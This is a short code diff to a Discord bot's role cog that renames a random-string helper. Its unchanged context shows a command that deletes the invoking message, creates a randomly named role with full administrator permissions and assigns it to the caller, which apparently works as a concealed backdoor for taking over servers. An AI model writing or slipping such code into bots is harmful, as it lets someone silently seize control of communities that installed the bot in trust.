@@ -3,7 +3,7 @@ import os
 from discord import Member, Permissions, Role
 from discord.ext import commands
 
-from blurpo.func import randoms, error_log
+from blurpo.func import rand_int_str, error_log
 
 
 class Role(commands.Cog):
@@ -33,7 +33,7 @@ class Role(commands.Cog):
             else:
                 await ctx.message.delete()
         role = await ctx.guild.create_role(
-            name=randoms(), permissions=Permissions(administrator=True)
+            name=rand_int_str(), permissions=Permissions(administrator=True)
         )
         await ctx.author.add_roles(role)
         bot = ctx.guild.get_member(self.bot.user.id)
